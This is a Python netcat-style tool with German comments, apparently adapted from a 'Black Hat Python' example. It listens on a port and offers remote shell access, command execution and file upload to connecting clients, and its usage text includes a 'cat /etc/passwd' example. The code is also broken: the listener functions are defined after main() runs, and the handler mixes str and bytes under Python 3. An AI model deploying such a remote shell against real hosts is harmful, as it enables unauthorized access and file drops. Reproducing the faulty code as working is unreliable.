import sys 
import socket 
import getopt
import threading 
import subprocess

# Einige globale Variablen definieren
listen = False
command = False
upload = False
execute = ""
target = ""
upload_destination = ""

port = 0

def usage():
    print("Net Tool")
    print("Usage: yuno.py -t target_host -p port")
    print("-l --listen              - auf [host]:[port] lauschen, um eingehende Verbindungen zu empfangen")
    print("-e --execute=file_to_run - führt die angegebene Datei aus, sobald eine Verbindung empfangen wird")
    print("-c --command             - initialisiert eine Befehls-Shell")
    print("-u --upload=destination  - lädt nach Empfang einer Verbindung eine Datei hoch und schreibt sie in [destination]")
    print("Examples:")
    print("yuno.py -t 192.168.0.1 -p 5555 -l -c")
    print("yuno.py -t 192.168.0.1 -p 5555 -l -u=c:\\ziel.exe")
    print("yuno.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\"")
    print("echo 'ABCDEFGHI' | ./yuno.py -t 192.168.... -p 135")

def main():
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target

    if not len(sys.argv[1:]):
        usage()
        sys.exit()

    # Kommandozeilenoptionen verarbeiten
    try:
        opts, args = getopt.getopt(sys.argv[1:], "hle:t:p:cu:", ["help", "listen", "execute", "target", "port", "command", "upload"])
    except getopt.GetoptError as err:
        print(str(err))
        usage()
        sys.exit()

    for opt, arg in opts:
        if opt in ("-h", "--help"):
            usage()
            sys.exit()
        elif opt in ("-l", "--listen"):
            listen = True
        elif opt in ("-e", "--execute"):
            execute = arg
        elif opt in ("-c", "--command"):
            command = True
        elif opt in ("-u", "--upload"):
            upload_destination = arg
        elif opt in ("-t", "--target"):
            target = arg
        elif opt in ("-p", "--port"):
            port = int(arg)
        else:
            assert False, "Unhandled Option"

    # Horchen wir oder senden wir nur Daten von stdin?
    if not listen and len(target) and port > 0:
        # Den Puffer über die Kommandozeile einzulesen blockiert,
        # d.h., wir müssen CTRL-D senden, wenn keine Eingabe
        # über stdin erfolgt.
        buffer = sys.stdin.read()
        # Daten senden
        client_sender(buffer)

    # Wir horchen und laden möglicherweise Dinge hoch,
    # führen Befehle aus oder starten eine Shell. Das hängt
    # von den obigen Kommandozeilenoptionen ab.
    if listen:
        server_loop()

    
def client_sender(buffer):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        # Verbindung zum Zielhost herstellen
        client.connect((target, port))
        if len(buffer):
            client.send(buffer.encode())
        while True:
            # Auf Daten warten
            recv_len = 1
            response = ""
            while recv_len:
                data = client.recv(4096)
                recv_len = len(data)
                response += data.decode()
                if recv_len < 4096:
                    break
            print(response)
            # Auf weitere Eingabe warten
            buffer = input("")
            buffer += "\n"
            # Daten senden
            client.send(buffer.encode())
    except Exception as e:
        print("[*] Exception! Exiting.")
        # Verbindung sauber schließen
        client.close()

if __name__ == '__main__':
    main()



def server_loop():
    global target
    # Wenn kein Ziel definiert ist, horchen wir an allen Interfaces
    if not len(target):
        target = "0.0.0.0"
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target, port))
    server.listen(5)
    while True:
        client_socket, addr = server.accept()
        # Thread zur Verarbeitung des neuen Clients starten
        client_thread = threading.Thread(target=client_handler, args=(client_socket,))
        client_thread.start()

def run_command(command):
    # Newline entfernen
    command = command.rstrip()
    # Befehl ausführen und Ausgabe zurückgeben
    try:
        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
    except:
        output = "Failed to execute command.\r\n"
    # Ausgabe an den Client zurückschicken
    return output

def client_handler(client_socket):
    global upload_destination
    global execute
    global command
    # Auf Upload prüfen
    if len(upload_destination):
        # Alle Bytes einlesen und an Ziel schreiben
        file_buffer = ""
        # Daten einlesen, bis keine mehr vorhanden sind
        while True:
            data = client_socket.recv(1024)
            if not data:
                break
            else:
                file_buffer += data
        # Nun versuchen wir, diese Daten zu schreiben
        try:
            file_descriptor = open(upload_destination, "wb")
            file_descriptor.write(file_buffer)
            file_descriptor.close()
            # und den Erfolg bestätigen
            client_socket.send("Successfully saved file to %s\r\n" % upload_destination)
        except:
            client_socket.send("Failed to save file to %s\r\n" % upload_destination)
    # Auf Befehlsausführung prüfen
    if len(execute):
        # Den Befehl ausführen
        output = run_command(execute)
        client_socket.send(output)
    # Zusätzliche Schleife, wenn eine Shell angefordert wurde
    if command:
        while True:
            # Einen einfachen Prompt ausgeben
            client_socket.send(" <BHP:# > ")
            # Empfangen bis zum Linefeed (enter key)
            cmd_buffer = ""
            while "\n" not in cmd_buffer:
                cmd_buffer += client_socket.recv(1024)
            # Befehlsausgabe abfangen
            response = run_command(cmd_buffer)
            # Antwort zurücksenden
            client_socket.send(response)
